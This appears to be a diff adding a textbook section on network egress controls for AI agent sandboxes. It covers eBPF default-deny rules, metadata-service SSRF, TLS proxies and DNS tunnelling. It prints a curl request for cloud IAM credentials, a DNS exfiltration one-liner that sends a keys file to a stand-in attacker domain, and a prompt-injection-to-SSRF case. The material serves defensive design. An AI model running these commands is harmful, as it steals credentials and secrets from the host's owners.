@@ -1,0 +1,152 @@
+## Network Egress Firewalls {#sec-vol3-virtualization-network}
+
+When an unprivileged agent process executes an unvetted script or compiler command inside an isolated guest namespace, an unrestricted network interface turns every computational task into a potential data exfiltration pipe or network weapon. A single call to `socket(AF_INET, SOCK_STREAM, 0)` exposes the execution runtime to the host's entire intranet, including link-local hypervisor interfaces, container cluster metadata servers, and arbitrary public endpoints. If the host assigns a standard bridge interface with Network Address Translation (NAT) without strict packet-level mediation, the agent can initiate outbound TCP handshakes to command-and-control servers or pivot laterally across adjacent corporate subnets.
+
+**Systems Takeaway:** Sandboxed execution must enforce default-deny network egress rules, transparent HTTP/TLS proxy inspection, and link-local IP blocks to eliminate credential exfiltration and SSRF attacks. Containment requires terminating ambient network authority at the virtual network boundary: every outbound packet must be explicitly matched against deterministic identity rules, dropped at the kernel ingress hook, or forwarded through an inspecting application-level proxy.
+
+::: {.column-margin}
+![Network egress isolation architecture.](images/svg/fig-vol3-network-egress.svg){#fig-vol3-network-egress}
+:::
+
+### The Default-Deny Primitive and Kernel Packet Traps
+
+The foundation of secure network virtualization is the invariant of zero ambient reachability ($A=0$). When a sandboxed execution domain is provisioned—whether a Linux network namespace (`CLONE_NEWNET`) or a hardware-virtualized microVM guest—the runtime must not provide a pre-configured, routed default gateway. In an unconfigured state, the sandbox's virtual ethernet interface (`veth`) or microVM TAP device attaches to an isolated host bridge that has no route to the host physical interface (`eth0`) and no active NAT forwarding rules.
+
+Relying on traditional user-space firewall wrappers or legacy `iptables` rules incurs substantial performance and maintenance penalties at high sandbox density. Standard `iptables` configurations depend on the kernel's `netfilter` subsystem, which traverses sequential rule chains for every packet traversal. In an agent host running hundreds of concurrent transient sandboxes, the connection tracking table (`nf_conntrack`) rapidly exhausts its memory bounds, while rule evaluation scales linearly with the number of active tenant interfaces. Modern high-density runtimes replace sequential table traversal with extended Berkeley Packet Filter (`eBPF`) programs attached directly to the Traffic Control (`tc`) subsystem or the cgroup socket egress hooks (`BPF_PROG_TYPE_CGROUP_SKB`).
+
+```
+Guest Userspace [ curl https://api.github.com ]
+       │
+       ▼ (Guest Kernel TCP Stack)
+Guest vNIC / TAP Device
+       │  (Host-Side veth / tap0)
+       ▼
+┌────────────────────────────────────────────────────────┐
+│ Host Kernel eBPF Hook (tc / egress)                   │
+│                                                        │
+│  1. Match IP Destination against 169.254.0.0/16?       │
+│     ├── TRUE  ──> Action: BPF_DROP (Log Alert)         │
+│     └── FALSE ──> Continue                             │
+│  2. Match IP Destination against RFC 1918 Intranet?    │
+│     ├── TRUE  ──> Action: BPF_DROP (Log Alert)         │
+│     └── FALSE ──> Continue                             │
+│  3. Match Packet against Proxy Enclave IP & Port?      │
+│     ├── TRUE  ──> Action: BPF_OK (Forward to Proxy)    │
+│     └── FALSE ──> Action: BPF_DROP (Default Deny)      │
+└────────────────────────────────────────────────────────┘
+```
+
+The eBPF filter operates at the earliest point of packet ingestion in the host networking stack, executing before the kernel allocates an `sk_buff` structure to full protocol processing. Outbound traffic must satisfy a strict packet disposition predicate:
+
+$$D(p) = \begin{cases} \text{FORWARD} & \text{if } p.\text{dst} = \text{IP}_{\text{proxy}} \land p.\text{dport} = P_{\text{proxy}} \\ \text{DROP} & \text{otherwise} \end{cases}$$
+
+Where $\text{IP}_{\text{proxy}}$ is the loopback or internal interface of a dedicated, unprivileged proxy enclave, and $P_{\text{proxy}}$ is its authenticated listening port. Any TCP SYN packet directed toward an arbitrary public IP address, internal cloud gateway, or foreign port is discarded in-kernel with zero context-switching overhead, returning an immediate destination unreachable or timing out without leaking packet bytes onto the physical fabric.
+
+### Server-Side Request Forgery and Link-Local Metadata Poisoning
+
+The most catastrophic failure mode of permissive agent networking is Server-Side Request Forgery (SSRF) directed at infrastructure metadata services. Modern cloud execution platforms (such as Amazon Web Services, Google Cloud Platform, and Microsoft Azure) provide hypervisor-level metadata services bound to the non-routable link-local IPv4 address `169.254.169.254` (RFC 3927) and IPv6 address `[fd00:ec2::254]`. These endpoints allow virtual instances to retrieve instance identity documents, bootstrap configurations, and—most critically—temporary IAM role credentials generated by the cloud control plane.
+
+When an autonomous agent generates shell scripts or executes Python code capable of network transmission, an indirect prompt injection attack can compel the model to issue an HTTP GET request to this link-local address. If the agent runs inside a container that shares the host's networking namespace or utilizes a standard Docker bridge with default NAT routing, the packet routes directly to the hypervisor's local metadata server:
+
+```bash
+$ curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/HostRole
+{
+  "Code" : "Success",
+  "LastUpdated" : "2026-09-19T10:14:02Z",
+  "Type" : "AWS-HMAC",
+  "AccessKeyId" : "ASIAIOSFODNN7EXAMPLE",
+  "SecretAccessKey" : "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
+  "Token" : "AQoDYXdzEJr1...=="
+}
+```
+
+Acquisition of these credentials immediately escalates the untrusted agent's privilege level to that of the host machine itself, breaking the isolation boundary entirely. Cloud providers attempt to mitigate this vulnerability using token-based metadata services (such as AWS IMDSv2), which mandate an HTTP `PUT` request with custom headers to establish a session token before serving credentials, coupled with an IP Time-To-Live (TTL) hop-limit restriction set to 1. The hop-limit prevents packets traversing an intermediate software bridge from reaching the metadata daemon. 
+
+However, relying on cloud provider TTL tricks violates the Principle of Complete Mediation. The host agent runtime must treat `169.254.0.0/16` as an inherently hostile target. The eBPF egress hook must evaluate the destination IPv4 address against an explicit blocklist containing the link-local space, the Kubernetes service CIDR block (typically `10.96.0.0/12`), and all private address allocations defined in RFC 1918 (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`):
+
+$$\mathcal{B}_{\text{blocked}} = \{ \text{169.254.0.0/16}, \text{10.0.0.0/8}, \text{172.16.0.0/12}, \text{192.168.0.0/16}, \text{127.0.0.0/8} \}$$
+
+If an agent process attempts to invoke a socket connection whose destination IP satisfies $p.\text{dst} \in \mathcal{B}_{\text{blocked}}$, the host kernel drops the initial SYN packet and logs an immediate policy violation trap to the host supervisor.
+
+### Transparent Forward Proxying and Protocol Validation
+
+While absolute network blackholing provides maximum isolation, production agents frequently require selective outbound internet access to complete assigned software engineering tasks. An agent tasked with resolving an issue in an open-source repository must clone Git remotes from `github.com`, download language runtimes from `nodejs.org`, and install third-party dependencies from package registries such as `pypi.org` or `registry.npmjs.org`. 
+
+To support external access without exposing raw TCP sockets, the runtime forces all outbound communication through an authenticated, inspecting forward proxy. The runtime injects the standard proxy environment variables into the guest workspace:
+
+```bash
+export HTTP_PROXY="http://10.0.0.1:8080"
+export HTTPS_PROXY="http://10.0.0.1:8080"
+export NO_PROXY="localhost,127.0.0.1"
+```
+
+Because an adversarial script or compromised binary can deliberately unset these environment variables and attempt raw TCP connections, the host's virtual network interface applies a transparent redirection rule (using `iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080` or an equivalent eBPF `bpf_sk_redirect_hash` program). Raw egress to ports 80 and 443 is forcibly redirected to the proxy daemon listening on the host interface.
+
+The forward proxy mediates client requests using one of two architectural strategies: Server Name Indication (SNI) allowlisting or full Transport Layer Security (TLS) Man-in-the-Middle (MitM) termination.
+
+| Property | SNI Domain Filtering | TLS MitM Termination |
+| :--- | :--- | :--- |
+| **Inspection Depth** | L4 + TLS ClientHello (Domain FQDN only) | L7 (HTTP Verb, Path, Headers, Body) |
+| **Guest CA Trust** | Unmodified system trust store | Requires custom root CA certificate in guest |
+| **Computational Overhead** | Near-zero (inspects initial packet, then splices) | High (dual cryptographic decryptions/encryptions) |
+| **Payload Exfiltration** | Permits data leaks via encrypted POST bodies | Can restrict methods to `GET` and scan bodies |
+| **Application Breakage** | Low (compatible with certificate pinning) | High (breaks pinned tools: `pip`, `npm`, `cargo`) |
+
+In an SNI filtering architecture, when the agent initiates an HTTPS connection, the client runtime sends an unencrypted `ClientHello` message during the initial TLS handshake. The forward proxy parses the Server Name Indication extension field to identify the target Fully Qualified Domain Name (FQDN). The proxy checks this FQDN against a compiled Radix tree containing the system's approved domain list. If the domain matches an approved pattern (e.g., `*.pypi.org`), the proxy establishes a TCP connection to the destination server and splices the two socket streams using the zero-copy `splice()` system call. If the FQDN is unauthorized (e.g., `attacker-command-control.com`), the proxy abruptly terminates the client connection with a TCP RST.
+
+While SNI filtering is lightweight and preserves the integrity of client-side certificate pinning, it leaves a significant security vulnerability open: once the TLS tunnel is established to an approved host (such as `github.com`), the proxy cannot inspect the HTTP method or payload. A compromised agent could exfiltrate internal system secrets by embedding them in an HTTP POST request to a public GitHub repository or a public gist. Where strict data loss prevention (DLP) is mandatory, the runtime must deploy full TLS termination. The host installs an ephemeral root CA into the sandbox's `/etc/ssl/certs/` bundle at initialization. The proxy intercepts the TLS handshake, terminates the encrypted connection with a dynamically minted leaf certificate, inspects the plaintext HTTP stream to enforce read-only semantics (blocking all `POST`, `PUT`, and `DELETE` requests), and re-encrypts the traffic to the upstream destination.
+
+### Covert Channels and DNS Exfiltration Vectors
+
+Even when all IPv4/IPv6 TCP and UDP egress is trapped or routed through a proxy, a critical communication vector remains open: the Domain Name System (DNS). Standard operating system networking stacks resolve human-readable domain names into IP addresses by dispatching UDP datagrams to port 53. If the host forwards guest DNS queries directly to external public resolvers (such as `8.8.8.8` or `1.1.1.1`), the agent inherits an out-of-band covert exfiltration channel known as a DNS tunnel.
+
+To exfiltrate an authentication token or confidential source code without establishing a direct TCP connection, a compromised agent process divides the sensitive payload into binary chunks, encodes each chunk into base32 or base64 format, and prepends the encoded string as a subdomain label onto an attacker-controlled authoritative domain:
+
+```bash
+$ cat /workspace/api_keys.env | base32 | tr -d '\n' | fold -w 50 | \
+  xargs -I {} dig +short {}.tunnel.adversary-domain.org
+```
+
+When the guest system executes this loop, the guest resolver dispatches standard UDP queries to its configured local recursor. The recursor cannot answer the request from cache because each subdomain is unique. Consequently, the recursor iteratively contacts the root nameservers, the `.org` top-level domain nameservers, and ultimately the authoritative nameserver for `adversary-domain.org`. The attacker's authoritative server logs the incoming subdomain strings and decodes the complete payload, entirely bypassing the host's TCP egress firewalls and forward proxies.
+
+To eliminate this vulnerability, the sandbox environment must never be configured with direct access to upstream or public DNS servers. The runtime establishes a split-horizon DNS enclave governed by three structural invariants:
+
+1. **Local Authoritative Synthesizer:** The sandbox's `/etc/resolv.conf` points exclusively to a loopback address serviced by an internal DNS daemon. This daemon does not perform iterative root resolution over the open internet.
+2. **Deterministic Domain Allowlist:** The resolver checks every incoming query against an explicit FQDN allowlist. If an agent queries `files.pythonhosted.org`, the resolver forwards the request to an upstream resolver. If the agent queries an unauthorized domain or an arbitrary foreign host, the resolver short-circuits execution and immediately returns an `NXDOMAIN` (Non-Existent Domain) response.
+3. **Entropy and Label Length Clamping:** For domains that support wildcard subdomains (such as dynamic cloud buckets), the resolver enforces an upper bound on label length ($L \le 32$ characters) and computes the Shannon entropy of incoming label strings:
+
+$$H(S) = -\sum_{i=1}^{n} P(c_i) \log_2 P(c_i)$$
+
+Where $P(c_i)$ represents the frequency of character $c_i$ within label $S$. Because base64-encoded binary payloads exhibit a flat, uniform character distribution ($H(S) \ge 4.8\text{ bits/char}$), queries exceeding the entropy threshold trigger an immediate drop and fire an alert to the host monitor.
+
+::: {.callout-note title="Worked Example: DNS Exfiltration Bandwidth vs. Monitored Enclave Bounds"}
+An agentic coding sandbox is compromised by a malicious dependency that attempts to exfiltrate an extracted $64\text{ KB}$ ($65{,}536\text{ bytes}$) private cryptographic key via iterative DNS lookups over UDP port 53.
+
+**Parameter Definitions:**
+- Payload size: $M_{\text{data}} = 65{,}536\text{ bytes}$
+- RFC 1035 label limit: $L_{\text{label}} = 63\text{ characters}$
+- Base32 encoding expansion factor: $E_{\text{b32}} = \frac{8}{5} = 1.60$ (chosen to avoid case-insensitive DNS collision)
+- Usable payload label per query: $C_{\text{query}} = 55\text{ bytes}$ of raw data (yielding $55 \times 1.60 = 88$ base32 characters, partitioned across two labels: `30char.58char.exfil.org`)
+- Unrestricted network UDP latency: $R_{\text{unrestricted}} = 15\text{ ms}$ per query (running 64 parallel threads)
+- Monitored enclave rate limit: $Q_{\text{limit}} = 2\text{ queries/second}$ per sandbox; maximum label length clamped to $L_{\max} = 24\text{ characters}$
+
+**Calculations:**
+
+1. *Unrestricted Exfiltration Profile:*
+   Total queries required to transmit the private key:
+   $$N_{\text{queries}} = \left\lceil \frac{M_{\text{data}}}{C_{\text{query}}} \right\rceil = \left\lceil \frac{65{,}536}{55} \right\rceil = 1{,}192\text{ queries}$$
+   With 64 concurrent worker threads over raw UDP sockets:
+   $$T_{\text{unrestricted}} \approx \frac{1{,}192\text{ queries} \times 0.015\text{ seconds}}{64} \approx 0.28\text{ seconds}$$
+   The exfiltration completes in less than $300\text{ ms}$, flying entirely under the radar of asynchronous human review.
+
+2. *Monitored Enclave Impact:*
+   Clamping the label length reduces usable raw payload per query to $C_{\text{monitored}} = 15\text{ bytes}$ ($15 \times 1.6 = 24\text{ characters}$).
+   New total queries required:
+   $$N_{\text{monitored}} = \left\lceil \frac{65{,}536}{15} \right\rceil = 4{,}370\text{ queries}$$
+   Under the enforced resolver rate limit of $Q_{\text{limit}} = 2\text{ queries/second}$:
+   $$T_{\text{monitored}} = \frac{4{,}370\text{ queries}}{2\text{ queries/second}} = 2{,}185\text{ seconds} \approx 36.4\text{ minutes}$$
+
+**Systems Takeaway:** Clamping query rates and label sizes degrades covert channel bandwidth from $234\text{ KB/s}$ to $30\text{ B/s}$—a reduction of over $7{,}800\times$. This stretches the exfiltration window from a fraction of a second to over half an hour, providing ample margin for runtime anomaly detection engines to terminate the offending execution namespace.
+:::
+
+Establishing an airtight isolation perimeter—combining capability attenuation, microVM kernel separation, copy-on-write storage overlays, and eBPF-enforced network egress proxies—ensures that untrusted agent code cannot damage host infrastructure or exfiltrate private assets. However, enforcing this multi-layered defensive boundary imposes significant initialization costs: booting a microVM kernel, mounting copy-on-write overlay branches, binding virtual network interfaces, and compiling packet filters takes hundreds of milliseconds to several seconds per invocation. If an autonomous agent orchestrates hundreds of tool invocations across an interactive reasoning trace, sequential on-demand instantiation paralyzes execution throughput. To deliver sub-second responsiveness without compromising isolation guarantees, the agent runtime must decouple environment initialization from execution dispatch through pre-warmed sandbox pooling.
